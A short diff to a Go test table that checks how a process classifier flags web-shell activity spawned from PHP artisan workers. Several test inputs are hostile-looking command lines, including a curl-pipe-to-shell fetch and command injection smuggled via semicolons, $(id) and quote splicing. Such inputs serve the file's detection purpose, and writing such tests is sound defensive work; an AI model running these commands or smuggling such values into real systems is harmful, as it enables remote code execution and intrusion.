@@ -254,6 +254,8 @@ func TestClassifyExec(t *testing.T) {
 		{system.Process{UID: 1000, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1"}, ReasonWebShell},
 		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c curl -s https://example.com/x | sh"}, ReasonWebShell},
 		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan x; id"}, ReasonWebShell},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c '/usr/bin/php8.3' 'artisan' dispatch:message > '/dev/null' 2>&1"}, ""},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c '/usr/bin/php8.3' 'artisan'x id"}, ReasonWebShell},
 		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan x $(id)"}, ReasonWebShell},
 		// In Alpine the shell is BusyBox; queue supervisors exec the worker; the scheduler runs a
 		// background task in a subshell that reports its end.
